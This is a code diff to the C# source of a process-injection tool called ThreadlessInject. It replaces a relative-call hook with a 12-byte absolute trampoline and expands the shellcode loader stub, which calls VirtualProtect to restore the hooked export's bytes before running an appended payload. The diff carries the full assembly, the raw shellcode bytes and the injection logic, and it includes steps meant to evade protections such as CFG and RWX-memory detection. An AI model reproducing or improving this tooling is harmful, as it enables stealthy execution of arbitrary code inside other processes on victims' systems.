@@ -1,11 +1,10 @@
-﻿using System;
+﻿using Mono.Options;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading;
-
-using Mono.Options;
 
 namespace ThreadlessInject;
 
@@ -30,10 +29,16 @@ internal static class Program
 
     private static readonly byte[] ShellcodeLoader =
     {
-        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
-        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
-        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
-        0xE0, 0x90
+        /* 0000 */ 0x58, 0x48, 0x83, 0xE8, 0x0C, 0x50, 0x53, 0x56, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52,
+        /* 0010 */ 0x41, 0x53, 0x5D, 0x48, 0x8B, 0xDD, 0x48, 0xBE, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 
+        /* 0020 */ 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 
+        /* 0030 */ 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 
+        /* 0040 */ 0x83, 0xC4, 0x28, 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x03, 
+        /* 0050 */ 0xB9, 0xCC, 0xBB, 0xAA, 0x99, 0x89, 0x4B, 0x08, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x08, 
+        /* 0060 */ 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 
+        /* 0070 */ 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 
+        /* 0080 */ 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 
+        /* 0090 */ 0x5A, 0x59, 0x5E, 0x53, 0xC3 // actual payload is appended here
     };
     
     private static IntPtr GetModuleHandle(string dll)
@@ -51,76 +56,138 @@ internal static class Program
         return IntPtr.Zero;
     }
 
-    private static void GenerateHook(long originalInstructions)
+    private static void GenerateHook(long originalInstructions_0_8, int originalInstructions_8_B, long virtProtAddr)
     {
         // This function generates the following shellcode.
-        // The hooked function export is determined by immediately popping the return address and subtracting by 5 (size of relative call instruction)
+        // The hooked function export is determined by immediately popping the return address and subtracting by 12, size of
+        //     movabs rax, xxxxyyyyxxxxyyyy
+        //     push rax
+        //     ret
+        //
         // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
         // The hooked function bytes are restored to the original values (essentially a one time hook)
-        // A relative function call is made to the injected shellcode that will follow immediately after the stub
+        // A function call is made to the injected shellcode that will follow immediately after the stub
         // Original function arguments are popped off the stack and restored to the correct registers
-        // A jmp back to the original unpatched export restoring program behavior as normal
+        // A ret back to the original unpatched export restoring program behavior as normal
         // 
-        // This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
-        // the injector can then monitor for when the restoration has occured to restore the memory back to RX
+        // This shellcode loader stub assumes that the injector has left the hooked function RX, so the stub has to call
+        // VirtualProtect to change the hooked function to RWX, restore the original bytes, and then change it back to RX
         //
-        // The movabs,mov are used to restore the original 8 bytes of the hooked function
+        // re-assemble:
+        //   ml64 /c /nologo stub.asm && dumpbin /rawdata stub.obj > stub.dump
+        //   0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")
 
         /*
-          start:
-            0:  58                      pop    rax
-            1:  48 83 e8 05             sub    rax,0x5
-            5:  50                      push   rax
-            6:  51                      push   rcx
-            7:  52                      push   rdx
-            8:  41 50                   push   r8
-            a:  41 51                   push   r9
-            c:  41 52                   push   r10
-            e:  41 53                   push   r11
+        .code
 
-        // change function back to RWX to overwrite the original bytes
-        sub rsp, 30h          ; Allocate shadow space (20h) + extra space for oldProtect variable (8h)
-        mov rcx, hookedFunc   ; Arg 1: The Address of the hooked function
-        mov rdx, 8            ; Arg 2: Size (only the first 8 bytes must be overwritten)
-        mov r8, 40h           ; Arg 3: New protect (PAGE_EXECUTE_READWRITE)
-        lea r9, [rsp + 20h]   ; Arg 4: Point out variable r9 to a temporary stack
-        mov rax, VirtProt     ; addr of VirtualProtect, must be calculated and written by injector
-        call rax
-        // add rsp, 30h          ; Clean up stack
+        MyStub PROC
 
-            10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
-            17: 33 22 11
-            1a: 48 89 08                mov    QWORD PTR [rax],rcx
+            ; ==========================================
+            ; 1. PROLOG: Save registers
+            ; ==========================================
+            pop rax                 ; Get return address (hooked function)
+            sub rax, 0Ch            ; Get actual start of hooked function (+12 bytes)
+    
+            push rax                ; Save hooked function address
+            push rbx                ; Save hookedFunc as rbx
+            push rsi                ; Save VirtProt as rsi
+    
+            ; Save other volatile registers
+            push rcx
+            push rdx
+            push r8
+            push r9
+            push r10
+            push r11
+        
+            ; ==========================================
+            ; 2. INITIALIZE: permanent registers once
+            ; ==========================================
+            pop rbp                        ; Temporary pop to grab the hookedFunc addr
+            mov rbx, rbp                   ; Store hookedFunc permanently in rbx
+            mov rsi, 0FFEEDDCCBBAA9988h    ; Store VirtProt permanently in rsi
 
-        // and change again back to RX
-        // sub rsp, 30h          ; Allocate shadow space (20h) + extra space for oldProtect variable (8h)
-        mov rcx, hookedFunc   ; Arg 1: The Address of the hooked function
-        mov rdx, 8            ; Arg 2: Size (only the first 8 bytes must be overwritten)
-        mov r8, 40h           ; Arg 3: New protect (PAGE_EXECUTE_READWRITE)
-        lea r9, [rsp + 20h]   ; Arg 4: Point out variable r9 to a temporary stack
-        mov rax, VirtProt     ; addr of VirtualProtect, must be calculated and written by injector
-        call rax
-        add rsp, 30h          ; Clean up stack
+            ; ==========================================
+            ; VIRTUALPROTECT (Change to RWX)
+            ; ==========================================
+            sub rsp, 20h            ; Allocate shadow space
+            sub rsp, 8              ; Extra 8 bytes for oldProtect scratch variable
+    
+            mov rcx, rbx            ; Arg 1: hookedFunc
+            mov rdx, 12             ; Arg 2: Size
+            mov r8, 40h             ; Arg 3: PAGE_EXECUTE_READWRITE (0x40)
+            lea r9, [rsp]           ; Arg 4: oldProtect pointer
+            call rsi                ; Call VirtualProtect
+    
+            add rsp, 28h            ; Clean up stack (20h + 8h)
 
+            ; ==========================================
+            ; RESTORE ORIGINAL 12 BYTES in hooked func
+            ; ==========================================
+            mov rax, 1122334455667788h    ; First 8 bytes of original prologue
+            mov QWORD PTR [rbx], rax      ; Write bytes to [rbx]
+            mov ecx, 99AABBCCh            ; Next 4 bytes
+            mov DWORD PTR [rbx + 8], ecx  ; Write bytes to [rbx + 8]
 
-            1d: 48 83 ec 40             sub    rsp,0x40
-            21: e8 11 00 00 00          call   shellcode
-            26: 48 83 c4 40             add    rsp,0x40
-            2a: 41 5b                   pop    r11
-            2c: 41 5a                   pop    r10
-            2e: 41 59                   pop    r9
-            30: 41 58                   pop    r8
-            32: 5a                      pop    rdx
-            33: 59                      pop    rcx
-            34: 58                      pop    rax
-            35: ff e0                   jmp    rax
-          shellcode:
+            ; ==========================================
+            ; VIRTUALPROTECT (Change back to RX)
+            ; ==========================================
+            sub rsp, 20h            ; Allocate shadow space
+            sub rsp, 8              ; Extra 8 bytes for oldProtect scratch variable
+    
+            mov rcx, rbx            ; Arg 1: hookedFunc
+            mov rdx, 12             ; Arg 2: Size
+            mov r8, 20h             ; Arg 3: PAGE_EXECUTE_READ (0x20)
+            lea r9, [rsp]           ; Arg 4: oldProtect pointer
+            call rsi                ; Call VirtualProtect
+    
+            add rsp, 28h            ; Clean up stack
+
+            ; ==========================================
+            ; CALL THE SHELLCODE
+            ; ==========================================
+            sub rsp, 40h            ; Allocate shadow space
+            call Payload            ; Call the actual supplied payload (call +11h)
+            add rsp, 40h            ; Clean up stack
+
+            ; ==========================================
+            ; EPILOG: Restore everything and exit
+            ; ==========================================
+            pop r11
+            pop r10
+            pop r9
+            pop r8
+            pop rdx
+            pop rcx
+            pop rsi
+
+            push rbx                ; rbx still hold hookedFunc addr
+            ret                     ; use ret to bypass CFG
+
+        MyStub ENDP
+
+        ; ==========================================
+        ; INLINE PAYLOAD BLOCK
+        ; ==========================================
+        Payload PROC
+            ; inserted dynamically
+        Payload ENDP
+
+        END
         */
 
         using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
-        //Write the original 8 bytes that were in the original export prior to hooking
-        writer.Seek(0x12, SeekOrigin.Begin);
-        writer.Write(originalInstructions);
+
+        // Write the VirtualProtect address into the shellcode loader stub
+        writer.Seek(0x18, SeekOrigin.Begin);
+        writer.Write(virtProtAddr);
+        writer.Flush();
+
+        //Write the original 12 bytes that were in the original export prior to hooking
+        writer.Seek(0x45, SeekOrigin.Begin);
+        writer.Write(originalInstructions_0_8);
+        writer.Seek(0x51, SeekOrigin.Begin);
+        writer.Write(originalInstructions_8_B);
         writer.Flush();
     }
 
@@ -250,24 +317,39 @@ internal static class Program
 
         if (loaderAddress == 0)
         {
-            Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
+            Console.WriteLine("[!] Failed to find a memory hole, bailing");
             return;
         }
 
         Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");
 
-        
-        // get the original bytes of the to-be-overwritten export function
-        var originalBytes = Marshal.ReadInt64(exportAddress);
-        GenerateHook(originalBytes);
+        var kernel32Handle = GetModuleHandle("kernel32.dll");
+        if (kernel32Handle == IntPtr.Zero)
+        {
+            Console.WriteLine("[!] Failed to get handle to kernel32.dll");
+            return;
+        }
+        var virtProtAddr = GetProcAddress(kernel32Handle, "VirtualProtect");
+        if (virtProtAddr == IntPtr.Zero)
+        {
+            Console.WriteLine("[!] Failed to get address of VirtualProtect");
+            return;
+        }
 
-        var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
-        var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };
+        // get the original 12 bytes of the to-be-overwritten export function
+        var originalBytes_0_8 = Marshal.ReadInt64(exportAddress);
+        var originalBytes_8_B = Marshal.ReadInt32(exportAddress + 0x8);
+        GenerateHook(originalBytes_0_8, originalBytes_8_B, (long)virtProtAddr);
 
-        using var ms = new MemoryStream(callOpCode);
-        using var br = new BinaryWriter(ms);
-        br.Seek(1, SeekOrigin.Begin);
-        br.Write(relativeLoaderAddress);
+        // overwrite with the new 12 bytes to call the loader stub
+        var callOpCode = new byte[] {
+            0x48, 0xB8,                  // [Index 0-1]   movabs rax, XXXX
+            0, 0, 0, 0, 0, 0, 0, 0,      // [Index 2-9]   full 8-bytes addressing (where the loader may be)
+            0x50,                        // [Index 10]    push rax
+            0xC3                         // [Index 11]    ret (call rax, i.e. the loader)
+        };
+        // Copy the 8-byte address to the shellcode loader into indices 2 through 9
+        BitConverter.GetBytes(loaderAddress).CopyTo(callOpCode, 2);
 
         // write the call to the loader stub
         ProtectVirtualMemory(
@@ -296,7 +378,7 @@ internal static class Program
             oldProtectHook,
             out _);
 
-        // write the shellcode loader stub to the code cave
+        // write the shellcode loader stub + shellcode to the code cave
         var payload = ShellcodeLoader.Concat(shellcode).ToArray();
 
         status = ProtectVirtualMemory(
@@ -361,7 +443,7 @@ internal static class Program
             Marshal.Copy(buf, temp, 0, bytesToRead);
             var currentBytes = BitConverter.ToInt64(temp, 0);
 
-            if (originalBytes == currentBytes)
+            if (originalBytes_0_8 == currentBytes)
             {
                 executed = true;
                 break;
